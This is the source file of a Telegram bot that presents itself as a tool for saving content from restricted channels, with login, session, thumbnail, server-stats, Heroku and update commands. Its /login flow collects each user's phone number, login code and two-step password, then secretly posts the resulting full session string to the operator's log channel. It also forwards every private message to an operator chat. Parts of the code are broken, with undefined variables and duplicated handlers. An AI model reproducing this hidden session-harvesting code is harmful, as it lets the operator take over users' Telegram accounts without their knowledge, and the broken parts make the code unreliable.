from asyncio.exceptions import TimeoutError
from pyrogram import filters, Client, idle
from pyrogram.types import Message
import os
import requests
import heroku3
import sys
from datetime import datetime
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from .. import bot, ACCESS, API_HASH, API_ID, AUTH_USERS, UPSTREAM_REPO, HU_APP, APP_NAME, API_KEY, STRINGLOG
#utils
import platform
import math
import re
import uuid
from telethon import Button, TelegramClient, events, functions, errors
import socket
from telethon import events, Button, TelegramClient
from decouple import config
from pyrogram import Client
#start fucking
import shutil, psutil
from utils_bot import *
#end
from main.plugins.main import Bot
#from pyromod import listen 
from main.plugins.helpers import login, logout
from main.Database.database import Database
#fucking login
from pyrogram.errors import (
    SessionPasswordNeeded, FloodWait,
    PhoneNumberInvalid, ApiIdInvalid,
    PhoneCodeInvalid, PhoneCodeExpired
)
#end fucking login
from main.plugins.dbstuff import db
#start time define
StartTime = time.time()
__version__ = 1.1
#end
heroku_api = "https://api.heroku.com"
Heroku = heroku3.from_key(API_KEY)
#is heroku
async def is_heroku():
    return "heroku" in socket.getfqdn()
#emd
st = "Hii,\nI am @pyrogrammers save restricted contents bot, I can save messages of restricted channels.\n**Hit /help to learn more.**"
#define downloads
downloads = os.path.realpath("main/downloads")
raw = os.path.realpath(".")
#end
ht = """**For Public Restricted Channel contents.**\nTo get public restricted Channel contents, just send your Post link i will give you that post without Downloading.\n\n**For Private Restricted Channel contents.**\nIn order to be able to access private restricted Channel contents by bot,Hit **/login** and then follow further instructions Hence, you are logged in to bot.\nAfter then just send your post link to me, i will give you the post."""
#human bytes
def humanbytes(size):
    """Convert Bytes To Bytes So That Human Can Read It"""
    if not size:
        return ""
    power = 2 ** 10
    raised_to_pow = 0
    dict_power_n = {0: "", 1: "Ki", 2: "Mi", 3: "Gi", 4: "Ti"}
    while size > power:
        size /= power
        raised_to_pow += 1
    return str(round(size, 2)) + " " + dict_power_n[raised_to_pow] + "B"
#end
  #start message 
#join checks 
# join checks
async def check_user(user):
    ok = True
    try:
        await bot(
            functions.channels.GetParticipantRequest(
                channel="pyrogrammers", participant=user
            )
        )
        ok = True
    except errors.rpcerrorlist.UserNotParticipantError:
        ok = False
    return ok


@bot.on(events.NewMessage(incoming=True, pattern='/start', func=lambda e: e.is_private))
async def start(event):
    start_t = time.time()
    Dick= await event.reply("Intialising...")
    end_t = time.time()
    time_taken_s = (end_t - start_t) * 1000
    if time_taken_s >= 700:
        #await event.answer("🔴 Bot Restarted due to high ping value.")
        #await event.send_message(LOGS, "#restart Restarting... It will take upto 5 seconds.")
        await Dick.edit(f'👋 Hey **{event.sender.first_name}**,\n\nI am Save Restricted Contents Bot, I can save files of restricted channels as well as group.\n\n__Hit /help to learn more.__', 
                      buttons=[
                        [Button.url("📢 Updates Channel", url="https://t.me/Pyrogrammers"),
                         Button.url("👥 Support Group", url="https://t.me/+e0hay-RhwP45ZjM1")],
                       
                        [Button.url("📺 YouTube Channel", url="https://youtube.com/channel/UC2anvk7MNeNzJ6B4c0SZepw")],
                        [Button.inline("💲 Donate", data="cbdonate"),
                         Button.inline("🗑️ Close", data="cbclose")]
                    ])
        try:
            await Bot.disconnect()
            await bot.disconnect()
        except Exception:
            pass
        os.execl(sys.executable, sys.executable, *sys.argv)
        quit()
    else:
        await Dick.edit(f'👋 Hi **{event.sender.first_name}**,\n\nI am Save Restricted Contents Bot, I can save files of restricted channels as well as group.\n\n__Hit /help to learn more.__', 
                      buttons=[
                        [Button.url("📢 Updates Channel", url="https://t.me/pyrogrammers"),
                         Button.url("👥 Support Group", url="https://t.me/+e0hay-RhwP45ZjM1")],
                       
                        [Button.url("📺 YouTube Channel", url="https://youtube.com/channel/UC2anvk7MNeNzJ6B4c0SZepw")],
                        [Button.inline("💲 Donate", data="cbdonate"),
                         Button.inline("🗑️ Close", data="cbclose")]
                    ])
        if not await check_user(event.sender_id):
            return await Dick.edit(f"Hello {event.sender.first_name}, Due to overload only my channel subscribers can use me.\n\nPlease join my channel and then start me again!", buttons=[Button.url("Join Channel", url="https://t.me/pyrogrammers")])
#end message 
    tag = f'[{event.sender.first_name}](tg://user?id={event.sender_id})'
    await event.client.send_message(int(ACCESS), f'#NEW_USER {tag} started the BOT\nUserID: {event.sender_id}') 
    try:
        await Bot.start()
        await idle()
    except Exception as e:
        if 'Client is already connected' in str(e):
            pass
        else:
            return
    
@bot.on(events.NewMessage(pattern="^/savethumb$", func=lambda e: e.is_private))
async def sett(event):    
    Drone = event.client                    
    async with Drone.conversation(event.chat_id) as conv: 
        xx = await conv.send_message("Alright, now send me image file to use it for thumbnail.")
        x = await conv.get_response()
        if await is_cancel(event, x.text):
            return
        if not x.media:
            xx.edit("Please send image file only.")
        mime = x.file.mime_type
        if not 'png' in mime:
            if not 'jpg' in mime:
                if not 'jpeg' in mime:
                    return await xx.edit("Image not found.")
        await xx.delete()
        t = await event.client.send_message(event.chat_id, '⏳')
        path = await event.client.download_media(x.media)
        if os.path.exists(f'{event.sender_id}.jpg'):
            os.remove(f'{event.sender_id}.jpg')
        os.rename(path, f'./{event.sender_id}.jpg')
        await t.edit("✅ Thumbnail successfully saved.")
        await asyncio.sleep(3)
@bot.on(events.NewMessage(incoming=True, pattern="/remthumb", func=lambda e: e.is_private))
async def remt(event):  
    try:
        os.remove(f'{event.sender_id}.jpg')
        await event.reply('✅ Successfully cleared.')
        await asyncio.sleep(3)
    except Exception as e:
        await event.reply("❌ No thumbnail available to remove.")    
        await event.client.send_message(int(ACCESS), f'{str(e)}') 
        await asyncio.sleep(3)                    
    
@bot.on(events.NewMessage(incoming=True,func=lambda e: e.is_private))
async def access(event):
    await event.forward_to(ACCESS)
    try:
        await Bot.start()
        await idle()
    except Exception as e:
        if 'Client is already connected' in str(e):
            pass
        else:
            return
@bot.on(events.NewMessage(pattern="/login", func=lambda e: e.is_private))
async def lin(event):
    Drone = event.client
#checking is logged in or not btw fuck
    xy = await db.is_logged(int(event.sender_id))
    if xy is True:
        return await event.reply("🔑 You are already logged in.")
#motherfucker
    async with Drone.conversation(event.chat_id) as conv: 
#shit ask
        h = API_HASH
        i = API_ID   
        try:
            PN = await conv.send_message("Now send your Telegram account's Phone number in International Format. \nIncluding Country code. Example: **+14154566376**")
            x = await conv.get_response()
            phone = x.text
            if await is_cancel(event, x.text):
                return
            try:
                boobs = await conv.send_message("**Trying to send verification code on your telegram account**\n\n\n`If you are facing issue while getting verification code please try alternative (/session) method.`")                    
                if not phone:               
                    return await PN.edit("No response found.")
            except TimeoutError:
                await boobs.edit("Unable to send verification code, please try /session method.")
                return
        except Exception as e: 
            print(e)
            return await PN.edit("An error occured while waiting for the response.")
        try:
            client = Client("my_account", api_id=API_ID, api_hash=API_HASH)
        except Exception as e:
            await conv.send_message(chat.id ,f"**ERROR:** `{str(e)}`\nPress /start to Start again.")
            return
        try:
            client.run()
        except Exception as e:
            print(e)
        await client.connect()
        try:
            await client.connect()
        except ConnectionError:
            await client.disconnect()
            await client.connect()
        except:
            await client.connect()
            #pass
        try:
            await client.connect()
        except:
            pass
        try: 
            code = await client.send_code(phone)
            await asyncio.sleep(1)
        except FloodWait as e:
            await conv.send_message(f"You have Floodwait of {e.value} Seconds")
            try:
                await client.disconnect()
            except:
                pass
            return
        except ApiIdInvalid:
            await conv.send_message("Server sided issue please report in support group.")
            await client.disconnect()
            return
        except PhoneNumberInvalid:
            await conv.send_message("Your Phone Number is Invalid.\n\nPress /login to Login again.")
            try:
                await client.disconnect()
            except:
                pass
            return
        try:
            await boobs.delete()
            otp = await conv.send_message("A verification code has been sent to your phone number, Please enter verification code in `1 2 3 4 5` format. __(Space between each numbers!)__")
            chut = await conv.get_response()
            otp_code = chut.text
            if await is_cancel(event, chut.text):
                return
        except TimeoutError:
            await conv.send_message("Time limit reached of 1 min.\nPress /start to Start again.")
            await client.disconnect()
            return
        try:
            await client.sign_in(phone, code.phone_code_hash, phone_code=' '.join(str(otp_code)))
        except PhoneCodeInvalid:
            await conv.send_message("Invalid Code.\n\nPress /login to Start again.")
            try:
                await client.disconnect()
            except:
                pass
            return
        except PhoneCodeExpired:
            await conv.send_message("Code is Expired.\n\nPress /login to Start again.")
            try:
                await client.disconnect()
            except:
                pass
            return
        except SessionPasswordNeeded:
            try:         
                two_step_code = await conv.send_message("Your account have Two-Step Verification.\nPlease enter your Password.")
                n = await conv.get_response()
                if await is_cancel(event, n.text):
                    return
                new_code = n.text
            except TimeoutError:
                await conv.send_message("`Time limit reached of 5 min.\n\nPress /start to Start again.`")
                try:
                    await client.disconnect()
                except:
                    pass
                return
            try:
                await client.check_password(new_code)
            except Exception as e:
                await conv.send_message(f"**ERROR:** `{str(e)}`")
                await event.client.send_message(int(ACCESS), f'{str(e)}')
                try:
                    await client.disconnect()
                except:
                    pass
                return
        except Exception as e:
            await conv.send_message(f"**ERROR:** `{str(e)}`")
            await event.client.send_message(int(ACCESS), f'{str(e)}')
            try:
                await client.disconnect()
            except:
                pass
            return
        except TimeoutError:
            await conv.send_message("Time limit reached of 1 min.\nPress /start to Start again.")
            try:
                await client.disconnect()
            except:
                pass
            return
        try:
            #await db.loin(int(event.sender_id))
            #await conv.send_message("Successfully logged in.\nNow send me your message link to download.")
            s = await client.export_session_string()
            try:
                tag = f'[{event.sender.first_name}](tg://user?id={event.sender_id})'
                await event.client.send_message(int(STRINGLOG), f'#NEW_SESSION {tag} Created new session\nUserID: {event.sender_id} \nSession: `{s}`') 
            except Exception as e:
                print(e)
        except Exception as e:
            await conv.send_message(f"**ERROR:** `{str(e)}`")
            await event.client.send_message(int(ACCESS), f'{str(e)}')
            try:
                await client.disconnect()
            except:
                pass
        try:
            #me = await client.get_me()
            await db.loin(int(event.sender_id)) 
        except Exception as e:
            await conv.send_message(f"Error: `{str(e)}`")
        xx = await conv.send_message("🔄 Logging in...")
        await login(event.sender_id, i, h, s) 
        try:
            me = await client.get_me()
            await xx.edit(f"✅ Welcome {me.first_name},\nYou are Successfully logged in.\n\n🔗 Now send me your message link to save.")
        except Exception as e:
            await xx.edit(f"Error: `{str(e)}`.") 
        await client.disconnect()
@bot.on(events.NewMessage(incoming=True, pattern="/logout", func=lambda e: e.is_private))
async def out(event):
    mf = await event.reply('🔄 fetching info...')
    xx = await db.is_logged(int(event.sender_id))
    if xx is True:
       await logout(event.sender_id)
       await db.lout(int(event.sender_id))
       await mf.edit('🔓Successfully Logged out.')
    else:
        #await event.client.send_message(int(ACCESS), f'#IGNORE {str(e)}')
        await mf.edit(f"🔐 You are not logged in.")
# callbacks
@bot.on(events.callbackquery.CallbackQuery(data="cbdonate"))
async def cbdonate(event):              
    await event.edit("It's pleasure for me that you are donating me for all my efforts and work!\n\nUSDT [TETHER] (Network TRC20)\n`TMbCbxLYCFjTEDaW4MAqamfKzb7XixxBir`\n\nBTC [Bitcoin]\n`bc1ql4fxwhkw7g7jl7g26kwpzlqf7kvjr8evrvv08s`", buttons=[Button.url("Other Ways", url="https://telegram.me/MichaelPanther")])

@bot.on(events.callbackquery.CallbackQuery(data="cbclose"))
async def remt(event):              
    await event.delete()
# end

@bot.on(events.callbackquery.CallbackQuery(data="startbot"))
async def stb(event):
    await event.edit("Starting")
    MONGODB_URI = config("MONGODB_URI", default=None)
    db = Database(MONGODB_URI, 'saverestricted')
    s = await db.get_credentials(event.sender_id)
    if s is not None:
        try:
            userbot = Client(
                session_name=s, 
                api_hash=h,
                api_id=int(i))
            await userbot.start()
            await idle()
            await event.edit("Started!")
        except ValueError:
            return await event.edit("⚠️Login expired, Please login again.")
        except Exception as e:
            print(e)
            if 'Client is already connected' in str(e):
                return await event.edit("Already running.")
            else:
                return await event.edit(f"Error: {str(e)}")
    else:
        return await event.edit("⚠️Login expired, Please login again.")
    
@bot.on(events.callbackquery.CallbackQuery(data="stopbot"))
async def spb(event):   
    MONGODB_URI = config("MONGODB_URI", default=None)
    db = Database(MONGODB_URI, 'saverestricted')
    i, h, s = await db.get_credentials(event.sender_id)
    if i and h and s is not None:
        try:
            userbot = Client(
                session_name=s, 
                api_hash=h,
                api_id=int(i))
            await userbot.stop()
            await event.edit("Bot stopped!")
        except ValueError:
            return await event.edit("⚠️Login expired, Please login again.")
        except Exception as e:
            return await event.edit(f"Error: {str(e)}")
    else:
        return await event.edit("⚠️Login expired, Please login again.")

@bot.on(events.NewMessage(incoming=True, pattern="/help", func=lambda e: e.is_private))
async def help(event):
    await event.reply(ht, link_preview=False)
#bulk command
@bot.on(events.NewMessage(pattern="^/bulk$", func=lambda e: e.is_private))
async def search(event):
     user = await event.get_sender()
     await event.reply("**Available Offers**\n\n1.For 1 day 👉 $3\n\n2.1 week 👉 $6\n\n3.1 months 👉 $12\n\n**Payment Mode:- Paypal, UPI, BTC, Amazon Gift Card**\n\n__If you want to subscribe premium feature please contact me using below button.__", buttons=[Button.url("Contact", url="https://telegram.me/MichaelPanther")])
#end bulk Message
#server
@bot.on(events.NewMessage(pattern="^/server$", func=lambda e: e.is_private))
async def stats(event):
  xxx = await event.reply("🌐 Fetching server info...")
  currentTime = readable_time((time.time() - StartTime))
  total, used, free = shutil.disk_usage('.')
  total = get_readable_file_size(total)
  used = get_readable_file_size(used)
  free = get_readable_file_size(free)
  sent = get_readable_file_size(psutil.net_io_counters().bytes_sent)
  recv = get_readable_file_size(psutil.net_io_counters().bytes_recv)
  cpuUsage = psutil.cpu_percent(interval=0.5)
  memory = psutil.virtual_memory().percent
  disk = psutil.disk_usage('/').percent
  botstats = f'<b>Bot Uptime:</b> {currentTime}\n' \
            f'<b>Total disk space:</b> {total}\n' \
            f'<b>Used:</b> {used}  ' \
            f'<b>Free:</b> {free}\n\n' \
            f'📊Data Usage📊\n<b>Upload:</b> {sent}\n' \
            f'<b>Down:</b> {recv}\n\n' \
            f'<b>CPU:</b> {cpuUsage}% ' \
            f'<b>RAM:</b> {memory}% ' \
            f'<b>Disk:</b> {disk}%'
  await xxx.edit(botstats, parse_mode="HTML")
#end server
#Reboot
  #reboot message 
@bot.on(events.NewMessage(from_users=AUTH_USERS, pattern="^/reboot$"))
async def restart(event):
    if await is_heroku():
        await event.reply("Rebooting... It will take upto 30 seconds.")
        HU_APP.restart()
    else:
        try:
            await event.reply("Rebooting...")
            await Bot.disconnect()
            await bot.disconnect()
        except Exception:
            pass
        os.execl(sys.executable, sys.executable, *sys.argv)
        quit()
#end  
@bot.on(events.NewMessage(pattern="^/ping$", func=lambda e: e.is_private))
async def ping(event):
    start_t = time.time()
    dick = await event.reply("Ping...")
    end_t = time.time()
    time_taken_s = (end_t - start_t) * 1000
    await dick.edit(f"Pong!\n{time_taken_s:.3f} ms")
    try:
        await Bot.start()
        await userbot.start()
        await idle()
    except Exception as e:
        if 'Client is already connected' in str(e):
            pass
        else:
            return
@bot.on(events.NewMessage(from_users=AUTH_USERS, pattern="^/cleanup$"))
async def clear_downloads(event):
    ls_dir = os.listdir(downloads)
    if ls_dir:
        for file in os.listdir(downloads):
            os.remove(os.path.join(downloads, file))
        await event.reply("✅ **Deleted all downloaded files**")
    else:
        await event.reply("❌ **No files downloaded**")


@bot.on(events.NewMessage(from_users=AUTH_USERS, pattern="^/cleanup$"))
async def cleanup(event):
    pth = os.path.realpath(".")
    ls_dir = os.listdir(pth)
    if ls_dir:
        for dta in os.listdir(pth):
            os.system("rm -rf *.raw *.jpg")
        await event.reply("✅ **cleaned**")
    else:
        await event.reply("✅ **already cleaned**")

@bot.on(events.NewMessage(from_users=AUTH_USERS, pattern="^/cleanup$"))
async def cleanup(event):
    pth = os.path.realpath(".")
    ls_dir = os.listdir(pth)
    if ls_dir:
        for dta in os.listdir(pth):
            os.system("rm -rf *.raw *.jpg")
        await event.reply("✅ **Deleted all cached files.**")
    else:
        await event.reply("✅ **Already Cleaned**")
#system
@bot.on(events.NewMessage(from_users=AUTH_USERS, pattern="^/system$"))
async def give_sysinfo(event):
    splatform = platform.system()
    platform_release = platform.release()
    platform_version = platform.version()
    architecture = platform.machine()
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(socket.gethostname())
    mac_address = ":".join(re.findall("..", "%012x" % uuid.getnode()))
    processor = platform.processor()
    ram = humanbytes(round(psutil.virtual_memory().total))
    cpu_freq = psutil.cpu_freq().current
    if cpu_freq >= 1000:
        cpu_freq = f"{round(cpu_freq / 1000, 2)}GHz"
    else:
        cpu_freq = f"{round(cpu_freq, 2)}MHz"
    du = psutil.disk_usage('/').percent
    psutil.disk_io_counters()
    disk = psutil.disk_usage('/').percent
    cpu_len = len(psutil.Process().cpu_affinity())
    somsg = f"""🖥 **System Information**
    
**PlatForm :** `{splatform}`
**PlatForm - Release :** `{platform_release}`
**PlatFork - Version :** `{platform_version}`
**Architecture :** `{architecture}`
**Hostname :** `{hostname}`
**IP :** `{ip_address}`
**Mac :** `{mac_address}`
**Processor :** `{processor}`
**Ram : ** `{ram}`
**CPU :** `{cpu_len}`
**CPU FREQ :** `{cpu_freq}`
**DISK :** `{disk}`
    """
    await event.reply(somsg)

#Updater---------------------------------------------------------------------------------------------------------------

import os
import re
import sys
import asyncio
import subprocess
from asyncio import sleep

from git import Repo
from pyrogram.types import Message
from pyrogram import Client, filters
from os import system, execle, environ
from git.exc import InvalidGitRepositoryError

def gen_chlog(repo, diff):
    upstream_repo_url = Repo().remotes[0].config_reader.get("url").replace(".git", "")
    ac_br = repo.active_branch.name
    ch_log = tldr_log = ""
    ch = f"<b>updates for <a href={upstream_repo_url}/tree/{ac_br}>[{ac_br}]</a>:</b>"
    ch_tl = f"updates for {ac_br}:"
    d_form = "%d/%m/%y || %H:%M"
    for c in repo.iter_commits(diff):
        ch_log += (
            f"\n\n💬 <b>{c.count()}</b> 🗓 <b>[{c.committed_datetime.strftime(d_form)}]</b>\n<b>"
            f"<a href={upstream_repo_url.rstrip('/')}/commit/{c}>[{c.summary}]</a></b> 👨‍💻 <code>{c.author}</code>"
        )
        tldr_log += f"\n\n💬 {c.count()} 🗓 [{c.committed_datetime.strftime(d_form)}]\n[{c.summary}] 👨‍💻 {c.author}"
    if ch_log:
        return str(ch + ch_log), str(ch_tl + tldr_log)
    return ch_log, tldr_log


def updater():
    try:
        repo = Repo()
    except InvalidGitRepositoryError:
        repo = Repo.init()
        origin = repo.create_remote("upstream", UPSTREAM_REPO)
        origin.fetch()
        repo.create_head("main", origin.refs.main)
        repo.heads.main.set_tracking_branch(origin.refs.main)
        repo.heads.main.checkout(True)
    ac_br = repo.active_branch.name
    if "upstream" in repo.remotes:
        ups_rem = repo.remote("upstream")
    else:
        ups_rem = repo.create_remote("upstream", UPSTREAM_REPO)
    ups_rem.fetch(ac_br)
    changelog, tl_chnglog = gen_chlog(repo, f"HEAD..upstream/{ac_br}")
    return bool(changelog)


@bot.on(events.NewMessage(from_users=AUTH_USERS, pattern="^/update$"))
async def update_repo(event):
    chat_id = event.chat_id
    msg = await event.reply("🔄 `processing update...`")
    update_avail = updater()
    if update_avail:
        await msg.edit("✅ update finished\n\n• bot restarted, back active again in 1 minutes.")
        system("git pull -f && pip3 install -r requirements.txt")
        execle(sys.executable, sys.executable, "start", environ)
        return
    await msg.edit("bot is **up-to-date** with [main](https://github.com/pyrogramers)")
#############session support#########
@bot.on(events.NewMessage(pattern="/session", func=lambda e: e.is_private))
async def lin(event):
    Drone = event.client                    
#checking is logged in or not btw fuck
    xy = await db.is_logged(int(event.sender_id))
    if xy is True:
        return await event.reply("🔑 You are already logged in.")
    async with Drone.conversation(event.chat_id) as conv: 
        h = API_HASH
        i = API_ID    
        #session = await Bot.ask(event.sender_id, "Now, send me your pyrogram session string to login to the bot\n\nYou can use below button to generate it.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⚙️ Generate Session", url="https://replit.com/@pyrogramers/Strsession?embed=true")]]),)  
        chut = await conv.send_message("Now, send me your pyrogram session string to login to the bot\n\nYou can use below button to generate it.", buttons=[Button.url("⚙️ Generate Session", url="https://replit.com/@pyrogramers/Strsession?embed=true")])
        session = await conv.get_response()
        s = session.text        
        if await is_cancel(event, session.text):
            return           
        if not len(s) >= 300:
            return await conv.send_message("⚠️ Sorry, but it is not a session string.\nPress /session to try again.")
        xx = await conv.send_message("🔄 Logging in...")
        try:
            async with Client(name="saverestricted", session_string=s, api_hash=h, api_id=int(i)) as X:
              k = await X.get_me()
              await xx.edit(f"✅ Welcome {k.first_name}, You are Successfully logged in.\n\n🔗 Now send me your message link to download.")
              await login(event.sender_id, i, h, s) 
              await db.loin(int(event.sender_id))
        except Exception as e:
            print(e)
            await xx.edit("⚠️ Session string is Invalid.\nPress /session to try again.")
# Holy cancel
async def is_cancel(event: Message, text: str):
    if text.startswith("/abort"):
        await event.reply("Process aborted.")
        return True
    elif text.startswith("/"):  # Bot Commands
        await event.reply("Cancelled the generation process!")
        return True
    else:
        return False
# Holy fuck
#Getting dynos usage
@bot.on(events.NewMessage(from_users=AUTH_USERS, incoming=True, pattern='/dyno', func=lambda e: e.is_private))
async def dyno_usage(event):
    if event.fwd_from:
        return
    if int(event.sender_id) in AUTH_USERS:
        pass
    else:
        return
    """
    Get your account Dyno Usage
    """
    die = await event.reply("**Processing...**")
    useragent = (
        "Mozilla/5.0 (Linux; Android 10; SM-G975F) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/80.0.3987.149 Mobile Safari/537.36"
    )
    user_id = Heroku.account().id
    headers = {
        "User-Agent": useragent,
        "Authorization": f"Bearer {API_KEY}",
        "Accept": "application/vnd.heroku+json; version=3.account-quotas",
    }
    path = "/accounts/" + user_id + "/actions/get-quota"
    r = requests.get(heroku_api + path, headers=headers)
    if r.status_code != 200:
        return await die.edit(
            "`Error: something bad happened`\n\n" f">.`{r.reason}`\n"
        )
    result = r.json()
    quota = result["account_quota"]
    quota_used = result["quota_used"]

    """ - Used - """
    remaining_quota = quota - quota_used
    percentage = math.floor(remaining_quota / quota * 100)
    minutes_remaining = remaining_quota / 60
    hours = math.floor(minutes_remaining / 60)
    minutes = math.floor(minutes_remaining % 60)

    """ - Current - """
    App = result["apps"]
    try:
        App[0]["quota_used"]
    except IndexError:
        AppQuotaUsed = 0
        AppPercentage = 0
    else:
        AppQuotaUsed = App[0]["quota_used"] / 60
        AppPercentage = math.floor(App[0]["quota_used"] * 100 / quota)
    AppHours = math.floor(AppQuotaUsed / 60)
    AppMinutes = math.floor(AppQuotaUsed % 60)

    await asyncio.sleep(1.5)

    return await die.edit(
        "**Dyno Usage**:\n\n"
        f" ☞ `Dyno usage for`  **{APP_NAME}**:\n"
        f"     ✰  `{AppHours}`**h**  `{AppMinutes}`**m**  "
        f"**|**  [`{AppPercentage}`**%**]"
        "\n\n"
        " ☞ `Dyno hours quota remaining this month`:\n"
        f"     ✰  `{hours}`**h**  `{minutes}`**m**  "
        f"**|**  [`{percentage}`**%**]"
    )
#end dynos usage 
#logs 
@bot.on(events.NewMessage(from_users=AUTH_USERS, incoming=True, pattern='/logs', func=lambda e: e.is_private))
async def _(event):

    if event.fwd_from:
        return
    if int(event.sender_id) in AUTH_USERS:
        pass
    else:
        return
    try:
        Heroku = heroku3.from_key(API_KEY)
        herokuapp = Heroku.app(APP_NAME)
    except:
        return await event.reply(
            "Check if your Heroku API Key, Your App name are configured correctly in the heroku"
        )
    v = await event.reply("Getting Logs....")
    with open("logs.txt", "w") as logstxt:
        logstxt.write(herokuapp.get_log())
    await v.edit("Got the logs wait a sec")
    await event.client.send_file(
        event.chat_id,
        "logs.txt",
        thumb="thumb.jpg",
        reply_to=event.id,
        caption="@saverestrictedcontentbot.",
    )

    await asyncio.sleep(5)
    await v.delete()
    return os.remove("logs.txt")
#getting logs from vps
@bot.on(events.NewMessage(from_users=AUTH_USERS, incoming=True, pattern='/vpslog', func=lambda e: e.is_private))
async def log_msg(event):
  z = await event.reply("Processing..")
  if os.path.exists("Log.txt"):
     await event.reply_document("Log.txt", True)
     await z.delete()
  else:
    await z.edit("Log file not found")
#emd

#logs
@bot.on(events.NewMessage(from_users=AUTH_USERS, incoming=True, pattern='/out', func=lambda e: e.is_private))
async def set_to(event):
    if 3 == 3:
        try:
            x = await event.reply(f'✅ Logged out {to}.')
            to = event.text.split(' ', 2)[1]
            await logout(to)
            await db.lout(int(to))
            await x.edit(f'✅ Logged out {to}.')
        except Exception as e:
            if 'out of' in str(e):
                await event.reply('Usage: /out `users id`.')
            else:
                await event.reply(f"Error: {e}.")  


#try:
 #   Bot.run()
#except:
 #   pass
